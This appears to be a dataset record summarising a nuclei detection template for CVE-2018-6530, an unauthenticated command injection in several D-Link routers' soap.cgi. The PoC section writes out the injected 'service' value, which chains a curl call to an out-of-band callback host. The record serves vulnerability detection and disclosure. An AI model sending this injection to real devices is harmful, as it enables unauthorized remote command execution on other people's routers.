---
cve_id: CVE-2018-6530
template_path: nuclei-templates/http/cves/2018/CVE-2018-6530.yaml
affected_product: D-Link
severity: critical
authentication: none
external_callback: true
affected_versions: DIR-880L (up to REVA_FIRMWARE_PATCH_1.08B04), DIR-868L (up to DIR868LA1_FW112b04), DIR-865L (up to REVA_FIRMWARE_PATCH_1.08.B01), DIR-860L (up to DIR860LA1_FW110b04)
preconditions: []
poc_classification: rce
---

## Vulnerability
Unauthenticated OS command injection in soap.cgi (soapcgi_main in cgibin) of D-Link DIR-880L (DIR-880L_REVA_FIRMWARE_PATCH_1.08B04 and previous), DIR-868L (DIR868LA1_FW112b04 and previous), DIR-865L (DIR-865L_REVA_FIRMWARE_PATCH_1.08.B01 and previous), and DIR-860L (DIR860LA1_FW110b04 and previous) allows remote attackers to execute arbitrary OS commands via the `service` parameter. CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-78. Listed in CISA KEV catalog. Successful exploitation enables full remote code execution on the device. Remediation: apply latest D-Link firmware.

## PoC / Detection
Classification: rce

The template sends a single raw POST request to `/soap.cgi?service=whatever-control;curl {{interactsh-url}};whatever-invalid-shell` (with SOAPAction and text/xml content) to trigger the injection, then matches on the resulting out-of-band HTTP interaction where the callback request contains User-Agent: curl.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2018-6530
- https://github.com/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- ftp://FTP2.DLINK.COM/SECURITY_ADVISEMENTS/DIR-860L/REVA/DIR-860L_REVA_FIRMWARE_PATCH_NOTES_1.11B01_EN_WW.pdf
- ftp://FTP2.DLINK.COM/SECURITY_ADVISEMENTS/DIR-868L/REVA/DIR-868L_REVA_FIRMWARE_PATCH_NOTES_1.20B01_EN_WW.pdf
